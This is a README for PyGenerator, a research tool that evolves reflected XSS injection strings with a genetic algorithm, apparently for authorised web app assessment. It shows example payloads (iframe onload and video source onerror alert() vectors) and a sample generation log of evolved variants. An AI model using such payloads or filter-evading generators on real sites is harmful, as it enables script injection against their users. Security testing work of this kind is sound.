## PyGenerator using Genetic Algorithm.

It's tool is generating injection codes for assessment of Web Apps.
Now, PyGenerator is beta version, it only supports reflective XSS.  
ex) <iframe/onload=alert();>size=<command, <video><source onerror=javascript:alert();>kind=

[more info](http://www.mbsd.jp/blog/takaesu_index.html)

## Description

PyGenerator uses Genetic Algorithm.
You must prepair Chrome of web driver for execution.

#### Examples
```
Generator>python ga_main.py
Using Theano backend.
Using gpu device 0: GeForce GTX 965M (CNMeM is disabled, cuDNN 5110)

Launched : chrome 60.0.3112.90
-----1 generation result-----
  Min:-2.3
  Max:-0.4
  Avg:-0.996
-----2 generation result-----
  Min:-2.2
  Max:-0.5
  Avg:-0.964
-----3 generation result-----
  Min:-1.8
  Max:-0.5
  Avg:-0.975

・・・

-----444 generation result-----
  Min:-1.8
  Max:-0.4
  Avg:-0.779
chrome 60.0.3112.90 : block : bgcolor=<video><source onerror=javascript:window.onerror=alert();>onerror=alert(); : [149, 2, 180, 206, 196]
-----445 generation result-----
  Min:-1.8
  Max:0.1
  Avg:-0.828
chrome 60.0.3112.90 : block : bgcolor=<video><source onerror=javascript:window.onerror=alert();>http-equiv= : [149, 2, 180, 206, 164]
-----446 generation result-----
  Min:-1.8
  Max:-0.4
  Avg:-0.826
chrome 60.0.3112.90 : block : bgcolor=<video><source onerror=javascript:window.onerror=alert();>http-equiv= : [149, 2, 180, 206, 164]
chrome 60.0.3112.90 : block : bgcolor=<video><source onerror=javascript:window.onerror=alert();>http-equiv= : [149, 2, 180, 206, 164]
chrome 60.0.3112.90 : block : bgcolor=<video><source onerror=javascript:window.onerror=alert();>http-equiv= : [149, 2, 180, 206, 164]
・・・
```

## Requirement libraries
* pandas
* requests
* selenium

## Operation check environment
* Python 2.7.12 (Anaconda2)
* pandas 0.18.1
* requests 2.13.0
* selenium 3.4.3

## Licence

[Apache License 2.0](https://github.com/13o-bbr-bbq/machine_learning_security/blob/master/Generator/LICENSE)

## Author

[Isao Takaesu](https://github.com/13o-bbr-bbq)
